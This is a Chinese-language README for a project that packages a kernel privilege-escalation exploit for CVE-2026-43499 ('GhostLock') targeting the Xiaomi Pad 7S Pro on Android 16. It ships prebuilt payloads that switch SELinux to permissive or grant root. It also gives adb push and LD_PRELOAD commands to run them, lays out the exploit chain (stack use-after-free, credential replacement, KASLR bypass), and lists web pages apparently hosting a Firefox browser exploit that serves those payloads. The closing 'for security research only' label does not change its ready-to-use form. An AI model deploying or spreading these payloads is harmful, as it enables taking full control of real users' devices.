# IonStack Violin — CVE-2026-43499

GhostLock 内核提权漏洞 — Xiaomi Pad 7S Pro (violin) Android 16

## 设备验证结果

| 产物 | 结果 | 证据 |
|------|------|------|
| `p.so` | ✅ 仅 Permissive | `getenforce: Enforcing → Permissive`; 日志 `selinux zero result: enforcing=0` |
| `r.so`（干净重启后） | ✅ Root | 日志 `got_root=1`，`uid=0 euid=0`；`/data/local/tmp/root_proof` 内容为 root，属主 root:root |
| `r2.so` | ✅ Root v2 | 同 r.so，优化版本 |

## 快速使用

```bash
# 推送到设备
adb push build/embed/p.so /data/local/tmp/
adb push build/embed/r.so /data/local/tmp/
adb push build/embed/r2.so /data/local/tmp/

# 运行 (permissive)
adb shell "cd /data/local/tmp && LD_PRELOAD=./p.so /system/bin/sh"

# 运行 (root)
adb shell "cd /data/local/tmp && LD_PRELOAD=./r.so /system/bin/sh"

# 验证
adb shell "getenforce"  # 应显示 Permissive
adb shell "id"          # 应显示 uid=0(root)
adb shell "cat /data/local/tmp/root_proof"
```

## 从源码构建

```bash
# 克隆
git clone https://github.com/liang1228/ionstack-violin.git
cd ionstack-violin

# (可选) 下载 KernelSU
# https://github.com/tiann/KernelSU/releases
cp ksud-arm64 build/embed/ksud_aarch64

# 构建
make PROJECT=violin-v-oss

# 推送
adb push build/violin-v-oss/bin/preload.so /data/local/tmp/
```

## 技术细节

- **漏洞**: CVE-2026-43499 (GhostLock) — rt_mutex PI chain walk 栈 UAF
- **内核**: 6.6.77-android15-8 (GKI), CFI_CLANG, UBSAN_TRAP
- **写入机制**: Direct pselect write (非 rb_insert)
- **利用链**: Stack UAF → Direct Write → cred 替换 → root
- **KASLR**: xbl_config DTB 解析（无需 root）或 perf_event_open

## 预构建产物

- `build/embed/p.so` — SELinux permissive only (83,632 bytes)
- `build/embed/r.so` — Root (86,464 bytes)
- `build/embed/r2.so` — Root v2 (86,664 bytes)

## 项目结构

```
src/
├── main.c              # 入口 + KASLR
├── fops.c              # pselect route + direct cred replace
├── util.c              # 内核页构造
├── pipe.c              # pipe_buffer 物理 R/W
├── root.c              # cred 替换
├── xbl_config.c        # XBL config DTB 解析（无需 root）
├── kernelsu.c          # KernelSU late-load
└── targets/violin-v-oss/
    └── target.h        # 符号偏移

docs/                   # GitHub Pages
├── index.html          # Firefox exploit 页面
├── exploit.html        # SpiderMonkey exploit iframe
└── *.so                # 预构建 payload
```

## 参考

- [KernelSU](https://github.com/tiann/KernelSU)
- [CVE-2026-43499 POC Analysis](https://github.com/Linuxoid-cn/CVE-2026-43499-Poc-Analysis)
- [xbl-dtb](https://github.com/Dere3046/xbl-dtb)

---
**仅供安全研究**
